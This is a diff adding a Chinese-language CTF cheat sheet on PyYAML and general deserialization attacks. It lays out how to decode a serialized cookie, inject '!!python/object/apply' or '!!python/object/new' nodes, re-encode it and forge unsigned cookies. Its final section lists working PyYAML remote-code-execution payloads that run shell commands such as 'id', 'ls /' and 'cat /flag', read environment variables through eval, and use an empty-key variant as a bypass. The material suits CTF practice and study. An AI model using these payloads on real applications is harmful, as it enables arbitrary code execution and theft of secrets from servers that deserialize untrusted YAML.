@@ -1,0 +1,174 @@
+# 🧩【题型：YAML / PyYAML 反序列化】（最终机构化整合）
+
+---
+
+# **1. 题目类型（去重整合）**
+
+### **1.1 Python / PyYAML**
+
+* PyYAML `yaml.load` / `unsafe_load` RCE
+* `!!python/object/apply` 注入
+* `!!python/object/new` 构造器链
+* Cookie 中保存 YAML → Base64 → 反序列化执行
+
+### **1.2 泛反序列化场景（整合）**
+
+* Python pickle / YAML
+* PHP `unserialize`
+* Java (Commons Collections / Gadget)
+* .NET BinaryFormatter
+
+---
+
+# **2. 解题输出思路（合并所有流程，不损失原内容）**
+
+### **2.1 PyYAML 反序列化链**
+
+1. 解码来源数据（Cookie/session/base64/hex/json）
+2. 判断数据是否为 YAML 结构
+3. 插入恶意节点：
+
+   * `!!python/object/apply`
+   * `!!python/object/new`
+4. 构造执行链：
+
+   * `eval()`
+   * `os.system()`
+   * `os.popen()`
+5. Base64（或特定编码，如 ISO-8859-1）重新编码
+6. 写入 Cookie 再访问
+7. 响应或字段中获取 flag
+
+### **2.2 泛反序列化题的统一流程**
+
+1. 找到序列化数据
+2. 解码（base64/hex/json）
+3. 修改对象结构 → 注入 Gadget
+4. 恶意执行链触发
+5. 读取输出或 flag
+
+---
+
+# **3. 解题关注点**
+
+### PyYAML 特有
+
+* 是否使用 `safe_load`
+* 是否允许 `!!python/object/*`
+* `object/apply` 是否可用（PyYAML 版本差异）
+* Cookie 是否无签名/无完整性校验
+* 字符编码（你的 强调 ISO-8859-1）
+* YAML 是否允许空键、换行、多字段
+
+### 泛反序列化关注点
+
+* 类型校验是否严格
+* 是否存在魔术方法（PHP `__destruct`）
+* 是否存在执行节点（Java Gadget）
+
+---
+
+# **4. 通用**
+
+## **4.1 通用步骤**
+
+* 定位序列化入口
+* 解码原序列化值
+* 攻击链注入（Gadget / apply / eval）
+* 保持结构完整性
+* 重新编码并写回
+
+---
+
+# **5. 方法论（去重整合）**
+
+### **5.1 PyYAML RCE 思路**
+
+* 找到 YAML 结构 → 注入执行标记：
+
+  * `!!python/object/apply:eval`
+  * `!!python/object/apply:os.system`
+  * `!!python/object/new`
+* 目标始终是构造一个能执行任意 Python 语句的对象。
+
+### **5.2 序列化题通用方法论**
+
+* “对象图分析”：找到执行路径
+* “执行节点搜寻”：找 destruct/apply/new
+* “一致编码还原”：保持与服务端一致的编码方式
+* “校验绕过”：利用无签名 Cookie 直接伪造
+
+---
+
+# **6. 启发性问题**
+
+* 服务端是否使用 `yaml.load` 或 unsafe_load？
+* 输入位置是否允许注入 `!!python/object/...`？
+* 是否有地方能回显执行结果？
+* cookie/session 是否无签名？可否伪造？
+* YAML 是否可写复杂结构（多行、嵌套、空键）？
+* 是否存在 Python 执行链（eval / os / subprocess）？
+
+---
+
+# **7. 绕过技巧**
+
+---
+
+# **7.1 基础 RCE Payload**
+
+### **使用 eval 执行任意代码**
+
+```yaml
+!!python/object/apply:eval
+- '__import__("os").popen("id").read()'
+```
+
+---
+
+# **7.2 常用 Payload（原样保留）**
+
+### **读取环境变量 FLAG（你的 原文）**
+
+```yaml
+- !!python/object:app.models.UrlObj
+  name: !!python/object/apply:eval ['__import__("os").environ.get("FLAG","NOT_FOUND")']
+  url:  !!python/object/apply:eval ['__import__("os").environ.get("FLAG","NOT_FOUND")']
+```
+
+---
+
+# **7.3 os.system 命令执行链**
+
+```yaml
+!!python/object/apply:os.system
+- "cat /flag"
+```
+
+---
+
+# **7.4 os.popen（可回显输出）**
+
+```yaml
+!!python/object/apply:eval
+- '__import__("os").popen("ls /").read()'
+```
+
+---
+
+# **7.5 object/new 构造链**
+
+```yaml
+!!python/object/new:os.system
+args: ["id"]
+```
+
+---
+
+# **7.7 空键名绕过（保持在原内容）**
+
+```yaml
+: !!python/object/apply:eval ['__import__("os").popen("cat /flag").read()']
+```
+
+---
